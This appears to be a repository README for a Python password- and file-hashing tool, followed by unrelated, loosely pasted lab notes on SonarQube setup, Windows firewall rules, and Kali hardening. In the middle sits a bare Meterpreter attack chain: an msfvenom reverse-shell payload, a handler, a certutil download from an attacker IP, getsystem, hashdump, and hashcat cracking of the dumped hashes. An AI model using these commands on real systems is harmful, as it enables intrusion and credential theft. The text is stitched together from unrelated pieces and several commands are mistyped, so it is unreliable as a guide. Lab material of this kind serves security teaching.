# sanhasher
This Tool will generate a live hash of your Password/Text, and will generate a hashes of your Files, and verify the password or text can be easily cracked by verifying it in the dictionary of wordlists.......
Menu:
1. Password Hash Generator
2. File Hash Generator
3. Password Hash Checker
99. Exit

This project demonstrates:
- Password/text hashing
- File integrity hashing
- Dictionary-based password strength checking

How to use:
- command: python3 sanhasher.py

Use your wordlists to crack or use a sample wordlist to do sample checking.....

Educational & offline use only.

"C:\Program Files\Tenable\Nessus\nessuscli.exe" lsuser

sudo /opt/nessus/sbin/nessuscli lsuser

"C:\Program Files\Tenable\Nessus\nessuscli.exe" chpasswd admin

Shift + F10
start ms-cxh:localonly

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f ece -o payload.exe

python3 -m https.server 8080

msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST 10.0.2.15

set LPORT 4444

run

certutil -urlcache -split -f https://10.0.2.15:8080/payload.exe payload.exe

payload.exe

getsystem

hashdump

echo "" > victim.txt

hashcat -m 1000 -a 0 victim.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1000 -a 0 victim.txt --show 

11..............................................................................................
Title 
Installation, Configuration, and Local Source Code Scanning using SonarQube and 
SonarScanner on Windows 
Aim 
To install and configure SonarQube and SonarScanner on Windows, set environment variables, 
create a local project, and perform static code analysis. 
Procedure: 
Step 1 — Install Java (OpenJDK 21) 
 Download Java - Download OpenJDK 21 from: 
https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html
 Install Java 
1. Run the installer  
2. Click Next  
3. Complete installation  
 Verify Java Installation 
Open Command Prompt: java –version 
Step 2 — Configure JAVA_HOME Environment Variable 
Locate Java Installation Path 
Example: C:\Program Files\Java\jdk-21 
Set JAVA_HOME 
Open Environment Variables 
1. Press: Windows + R 
2. Type: sysdm.cpl 
3. Open: Advanced → Environment Variables 
Create JAVA_HOME Variable 
Under System Variables: 
Click: New 
Add: 
Variable 
Value 
JAVA_HOME C:\Program Files\Java\jdk-17 
Edit Path Variable 
Under System Variables: 
Select: Path → Edit → New 
Add: %JAVA_HOME%\bin 
Step 3 — Download SonarQube 
Download Community Edition from: https://www.sonarsource.com/products/sonarqube/downloads/
Step 4 — Extract SonarQube 
1. Extract ZIP file using 7-Zip or WinRAR  
2. Extract to:  
C:\SonarQube 
Example Directory: C:\SonarQube\sonarqube-25.x 
Step 5 — Start SonarQube Server 
Navigate to: C:\SonarQube\sonarqube-25.x\bin\windows-x86-64 
Run: StartSonar.bat 
A terminal window opens. 
Wait until message appears: 
SonarQube is operational 
Step 6 — Access SonarQube Dashboard 
Open Browser: http://localhost:9000 
Default Login Credentials 
Username Password 
admin Admin 
After login: 
Change the default password. 
Step 7 — Download SonarScanner 
Download from: https://docs.sonarsource.com/sonarqube-server/analyzing-source
code/scanners/sonarscanner
Step 8 — Extract SonarScanner 
Extract ZIP file to: C:\sonar-scanner 
Step 9 — Configure SonarScanner Environment Variables 
Open Environment Variables 
Press: Windows + R 
Type: sysdm.cpl 
Open: Advanced → Environment Variables 
Create SONAR_SCANNER_HOME 
Click:New 
Add: 
Variable 
SONAR_SCANNER_HOME C:\sonar-scanner 
Value 
Edit Path Variable 
Add: %SONAR_SCANNER_HOME%\bin 
Step 10 — Verify SonarScanner Installation 
Open New Command Prompt: sonar-scanner -version 
Step 11 — Generate SonarQube Authentication Token 
Login to SonarQube Dashboard. 
Navigate: Administration → Security → Users → Tokens 
Generate Token:  
Example: student-token 
Copy and Save the Token. 
Step 12 — Create Sample Local Project 
Create Folder: C:\sonar-project 
(Create Python File 
Create: 
app.py 
Add Sample Vulnerable Code: 
password = "admin123" 
def login(user): 
if user == "admin": 
print("Welcome Admin") 
login("admin"))   
or (Paste the project file you want to scan)  C:\sonar-project 
Step 13 — Create SonarScanner Configuration File 
Inside Project Folder: 
Create file: sonar-project.properties 
Add: 
sonar.projectKey=Project Name (Replace your name) 
sonar.projectName=Project Name (Replace your name) 
sonar.projectVersion=1.0 
sonar.sources=. 
sonar.host.url=http://127.0.0.1:9000 
sonar.login= YOUR_GENERATED_TOKEN 
Replace: 
YOUR_GENERATED_TOKEN 
with actual token. 
Step 14 — Run SonarScanner 
Open Command Prompt. 
Navigate to Project Directory:  C:\sonar-project 
Run: sonar-scanner 
Step 15 — View Scan Report 
Open Browser: http://localhost:9000 
Navigate to: Projects → Local Project 
Analyze: 
 Bugs  
 Vulnerabilities  
 Code Smells  
 Security Hotspots  
 Duplicated Code

10......................................................................................
Step 9: Verify Firewall Configuration 
Open Command Prompt. 
View firewall profiles: 
netsh advfirewall show allprofiles 
View firewall rules: 
netsh advfirewall firewall show rule name=all 
Step 10: Test Blocked Port 
Use a browser or another test application to verify that the blocked port cannot be accessed. 
If the Telnet Client is installed, test the blocked port: 
telnet localhost 21 
The connection should be blocked according to the configured firewall rule. 
Part E – Enable Firewall Logging 
Step 11: Configure Firewall Logging 
1. Open Windows Defender Firewall with Advanced Security. 
2. Right-click Windows Defender Firewall with Advanced Security on Local Computer. 
3. Select Properties. 
4. Under each profile (Domain, Private, Public), click Customize in the Logging section. 
5. Enable logging for dropped packets and successful connections. 
6. Apply the changes. 
Default log file location: 
C:\Windows\System32\LogFiles\Firewall\pfirewall.log

2.................................................................................
Part B – Kali Linux Hardening 
Step 1: Update Operating System 
Update package repositories: 
sudo apt update 
Upgrade installed packages: 
sudo apt full-upgrade -y 
Step 2: Create a Non-Root Administrative User 
Create user: sudoadduser analyst 
Grant sudo privileges: sudo usermod –aG sudo analyst 
Step 3: Disable Direct Root Login 
Lock root account: sudo passwd -l root 
Verify: sudo passwd -S root 
Expected Output: 
Root L 
(L = Locked) 
Step 4: Configure UFW Firewall 
Install firewall: sudo apt install ufw -y 
Set default policies: 
 sudo ufw default deny incoming 
 sudo ufw default allow outgoing 
Allow SSH service: sudo ufw allow 22/tcp 
Enable firewall: sudo ufw enable 
Step 5: Disable Unnecessary Services 
List running services: sudo systemctl list-units –type=service –state=running 
Disable unused services: 
 sudo systemctl disable –now apache2 
 sudo systemctl disable –now postgresql 
Step 6: Secure SSH Configuration 
Install SSH server: sudo apt install openssh-server -y 
Enable service: sudosystemctl enable –now ssh 
Modify: 
 Port 2222 
 Permit Root Login no 
 Password Authentication no 
 Allow Users analyst 
Step 7: Configure AppArmor 
Install AppArmor: sudo apt install apparmor apparmor-utils -y 
Enable service: sudosystemctl enable –now apparmor 
Enforce all profiles: 
sudo aa-enforce /etc/apparmor.d/* 
Step 8: Enable Audit Logging 
Install Audit Framework: sudo apt install auditd audispd-plugins -y 
Enable service: sudo systemctl enable –now auditd 
Audit logs location: 
/var/log/audit/audit.log 
View logs: sudoausearch -ts today 
Step 9: Configure Logwatch 
Install Logwatch: sudo apt install logwatch -y 
Generate report: sudo logwatch –detail High –range today –service All 
Save report: sudo logwatch –detail High –range today –output file –filename report.txt 
Step 10: Verify Security Configuration 
Run the following checks: 
Firewall 
sudo ufw status 
SSH 
sudo systemctl status ssh 
AppArmor 
sudo aa-status 
Auditd 
sudo systemctl status auditd 
Logwatch 
sudo logwatch –range today

